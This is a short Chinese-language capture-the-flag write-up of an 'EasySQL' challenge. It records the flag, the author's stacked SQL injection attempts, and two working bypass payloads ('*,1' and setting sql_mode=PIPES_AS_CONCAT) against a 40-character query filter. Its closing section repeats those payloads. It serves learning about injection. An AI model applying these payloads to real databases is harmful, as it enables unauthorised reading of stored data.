---
Author: SuperJason
Date: 2020-12-30
---

## flag
`flag{5f61a351-bedc-4807-a8c6-9aa90ccacd54}`

## 思路
1. 访问环境，`union select or from and flag`等关键字被过滤，双写、大写绕过无效。  
2. `1;show tables; -- -`与`1';show tables; -- -`结果不同，判定为整形注入。  
   ![](./images/easysql-1.png)
3. `1;show databases; -- -`   
   ![](./images/easysql-2.png)
4. 准备构造`select flag from Flag`，由于四个词都被过滤，考虑用16进制转码`1;0x73656c656374666c616766726f6d466c6167;-- -`，但提示too long，没有绕过。
5. 这题看了wp才知道后端逻辑是`$sql = "select ".$post['query']."||flag from Flag";`，并且限制了字符字数为40个。
6. 网上给了2种wp
   - 查询法：`*,1`，使用`*,1`放入查询语句，就能查出当前Flag表中的所有内容
   - 操作符重置法:`1;set sql_mode=PIPES_AS_CONCAT;select 1`，使用`set sql_mode=PIPES_AS_CONCAT`将||视为字符串的连接操作符而非或运算符。   
    ![](./images/easysql-3.png)
## 总结
这道题没有做出来还是很可惜的，定位到堆叠注入后，却由于字符限制无法注入。没有猜对后端逻辑，自己还用`-- -`去注释后面的语句，以后可以直接利用原始语句去查询，这题当做一个积累。
   - 查询法：`*,1`，使用`*,1`放入查询语句，就能查出当前Flag表中的所有内容
   - 操作符重置法:`1;set sql_mode=PIPES_AS_CONCAT;select 1`，使用`set sql_mode=PIPES_AS_CONCAT`将||视为字符串的连接操作符而非或运算符。
